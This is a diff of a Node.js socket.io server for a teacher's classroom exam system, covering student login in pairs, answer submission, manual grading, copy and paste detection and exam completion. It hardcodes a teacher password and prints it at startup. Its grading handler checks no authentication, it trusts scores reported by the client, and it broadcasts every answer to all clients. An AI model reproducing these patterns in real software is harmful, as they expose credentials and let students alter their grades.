+    const duplaNormalizada = normalizeText(dupla);
+
+    console.log('Tentativa login:', nameNormalizado, '| Dupla:', duplaNormalizada);
+
+    const duplaEncontrada = getDuplaByAluno(nameNormalizado);
+    if(!duplaEncontrada) {
+      socket.emit('login_error', { error: 'Aluno não cadastrado' });
+      return;
+    }
+
+    if(normalizeText(duplaEncontrada.nome) !== duplaNormalizada) {
+      socket.emit('login_error', { error: 'Dupla incorreta para este aluno' });
+      return;
+    }
+
+    let existingStudent = null;
+    for(let [id, s] of students) {
+      if(s.name === nameNormalizado) {
+        existingStudent = s;
+        break;
+      }
+    }
+
+    if(existingStudent && existingStudent.finished) {
+      socket.emit('login_success', {
+        studentId: existingStudent.id,
+        name: existingStudent.name,
+        dupla: existingStudent.dupla,
+        alreadyFinished: true,
+        completionCode: existingStudent.completionCode,
+        correctCount: existingStudent.correctCount || 0,
+        totalTime: existingStudent.totalTime || 0,
+        allAnswers: existingStudent.answers || {}
+      });
+      return;
+    }
+
+    let studentId;
+    let student;
+
+    if(existingStudent) {
+      studentId = existingStudent.id;
+      student = existingStudent;
+    } else {
+      studentId = uuidv4();
+      student = {
+        id: studentId,
+        name: nameNormalizado,
+        dupla: duplaNormalizada,
+        socketId: null,
+        online: false,
+        finished: false,
+        loginTime: new Date().toISOString(),
+        totalTime: 0,
+        answers: {},
+        warnings: [],
+        completionCode: null,
+        correctCount: 0,
+        copyCount: 0,
+        pasteCount: 0
+      };
+      students.set(studentId, student);
+      answers.set(studentId, {});
+      sessions.set(studentId, { startTime: Date.now(), lastActivity: Date.now() });
+      io.emit('new_student', { studentId, name: nameNormalizado, dupla: duplaNormalizada });
+      saveData();
+    }
+
+    if(student.socketId) {
+      const old = io.sockets.sockets.get(student.socketId);
+      if(old) { old.emit('force_disconnect', { reason: 'Nova conexão' }); old.disconnect(); }
+    }
+
+    student.socketId = socket.id;
+    student.online = true;
+    student.loginTime = new Date().toISOString();
+    currentStudentId = studentId;
+
+    const studentAnswers = answers.get(studentId) || {};
+
+    io.emit('student_status_change', { studentId, online: true, name: student.name });
+    socket.emit('login_success', {
+      studentId,
+      name: student.name,
+      dupla: student.dupla,
+      answers: studentAnswers,
+      alreadyFinished: false
+    });
+
+    console.log('✅ ' + student.name + ' logou | Dupla: ' + student.dupla);
+    saveData();
+  });
+
+  // ===== ALUNO ENVIA RESPOSTA =====
+  socket.on('answer_submitted', (data) => {
+    const { studentId, questionId, answer, timeSpent } = data;
+    
+    const student = students.get(studentId);
+    if(!student || student.finished) return;
+
+    const studentAnswers = answers.get(studentId) || {};
+    
+    studentAnswers[questionId] = {
+      answer: answer,
+      timeSpent: timeSpent,
+      isCorrect: null, // Aguardando correção do professor
+      timestamp: new Date().toISOString()
+    };
+    
+    answers.set(studentId, studentAnswers);
+    student.answers = studentAnswers;
+
+    const session = sessions.get(studentId);
+    if(session) {
+      student.totalTime = Math.round((Date.now() - new Date(session.startTime).getTime()) / 1000);
+    }
+
+    students.set(studentId, student);
+    io.emit('student_answer', { studentId, questionId, answer });
+    console.log('📝 ' + student.name + ' - Q' + questionId + ': ' + answer + ' (aguardando correção)');
+    saveData();
+  });
+
+  // ===== PROFESSOR CORRIGE RESPOSTA =====
+  socket.on('correct_answer', (data) => {
+    const { studentId, questionId, isCorrect, correctedBy, correctedAt } = data;
+    
+    const student = students.get(studentId);
+    if(!student) return;
+
+    const studentAnswers = answers.get(studentId) || {};
+    
+    if(studentAnswers[questionId]) {
+      studentAnswers[questionId].isCorrect = isCorrect;
+      studentAnswers[questionId].correctedBy = correctedBy;
+      studentAnswers[questionId].correctedAt = correctedAt || new Date().toISOString();
+      
+      answers.set(studentId, studentAnswers);
+      student.answers = studentAnswers;
+      
+      // Atualiza contagem de acertos
+      let correctCount = 0;
+      Object.values(studentAnswers).forEach(a => {
+        if(a && a.isCorrect === true) correctCount++;
+      });
+      student.correctCount = correctCount;
+      
+      students.set(studentId, student);
+      
+      // Notifica todos os clientes sobre a correção
+      io.emit('answer_corrected', {
+        studentId,
+        questionId,
+        isCorrect,
+        correctedBy,
+        correctedAt: studentAnswers[questionId].correctedAt
+      });
+      
+      console.log('📋 ' + student.name + ' - Q' + questionId + ' corrigida: ' + (isCorrect ? '✓ Correta' : '✗ Errada'));
+      saveData();
+    }
+  });
+
+  // ===== COPIA DETECTADA =====
+  socket.on('copy_detected', ({ studentId }) => {
+    const student = students.get(studentId);
+    if(student && !student.finished) {
+      student.copyCount = (student.copyCount || 0) + 1;
+      student.warnings.push({
+        type: 'Cópia detectada',
+        timestamp: new Date().toISOString(),
+        count: student.copyCount
+      });
+      students.set(studentId, student);
+      io.emit('student_warning', { studentId, warning: 'Cópia detectada' });
+      console.log('📋 ' + student.name + ' - Cópia detectada');
+      saveData();
+    }
+  });
+
+  // ===== COLA DETECTADA =====
+  socket.on('paste_detected', ({ studentId }) => {
+    const student = students.get(studentId);
+    if(student && !student.finished) {
+      student.pasteCount = (student.pasteCount || 0) + 1;
+      student.warnings.push({
+        type: 'Cola detectada',
+        timestamp: new Date().toISOString(),
+        count: student.pasteCount
+      });
+      students.set(studentId, student);
+      io.emit('student_warning', { studentId, warning: 'Cola detectada' });
+      console.log('📄 ' + student.name + ' - Cola detectada');
+      saveData();
+    }
+  });
+
+  // ===== FINALIZAR PROVA =====
+  socket.on('exam_finished', (data) => {
+    const { studentId, answers: studentAnswers, totalTime, completionCode, studentName, studentDupla, correctCount } = data;
+    
+    const student = students.get(studentId);
+    if(!student || student.finished) return;
+
+    student.finished = true;
+    student.online = false;
+    student.completionCode = completionCode;
+    student.totalTime = totalTime;
+    student.answers = studentAnswers;
+    student.correctCount = correctCount;
+
+    const savedAnswers = {};
+    Object.keys(studentAnswers).forEach(qId => {
+      savedAnswers[qId] = studentAnswers[qId];
+    });
+    answers.set(studentId, savedAnswers);
+
+    students.set(studentId, student);
+    
+    io.emit('student_finished', { 
+      studentId, 
+      completionCode,
+      correctCount,
+      totalTime,
+      warnings: student.warnings.length,
+      name: studentName,
+      dupla: studentDupla
+    });
+
+    console.log('✅ ' + student.name + ' finalizou | Código: ' + completionCode);
+    saveData();
+  });
+
+  // ===== DESCONEXÃO =====
+  socket.on('disconnect', () => {
+    console.log('Cliente desconectado:', socket.id);
+    if(currentStudentId) {
+      const student = students.get(currentStudentId);
+      if(student && !student.finished) {
+        student.online = false;
+        const session = sessions.get(currentStudentId);
+        if(session) {
+          student.totalTime = Math.round((Date.now() - new Date(session.startTime).getTime()) / 1000);
+        }
+        students.set(currentStudentId, student);
+        io.emit('student_status_change', { 
+          studentId: currentStudentId, 
+          online: false, 
+          name: student.name 
+        });
+        console.log('❌ ' + student.name + ' desconectado');
+        saveData();
+      }
+    }
+  });
+});
+
+// ========== INICIAR SERVIDOR ==========
 server.listen(PORT, '0.0.0.0', () => {
-  console.log(`\n💕 Servidor Romântico rodando na porta ${PORT}`);
-  console.log(`Abra primeiro no CELULAR!\n`);
+  console.log('\n✦ SISTEMA PROFESSOR HEBER LEMOS ✦');
+  console.log('   Porta: ' + PORT);
+  console.log('   Professor: http://localhost:' + PORT);
+  console.log('   Aluno: http://localhost:' + PORT);
+  console.log('\n● Acesso:');
+  console.log('   Senha Professor: heber123456');
+  console.log('\n● Duplas Cadastradas:');
+  DUPLAS.forEach(d => {
+    console.log('   ' + d.nome + ':');
+    d.alunos.forEach(a => console.log('      - ' + a));
+  });
+  console.log('\n   Para adicionar mais duplas, edite a constante DUPLAS');
+  console.log('   no arquivo server.js');
+  console.log('\n● Funcionalidades:');
+  console.log('   ✓ Aluno digita a resposta em um campo de texto');
+  console.log('   ✓ Professor corrige manualmente (Certo/Errado)');
+  console.log('   ✓ Aluno vê o resultado em tempo real');
+  console.log('   ✓ Dados permanentes (salvos em data.json)');
+  console.log('   ✓ Uma chance por dupla (bloqueio após finalizar)\n');
 });
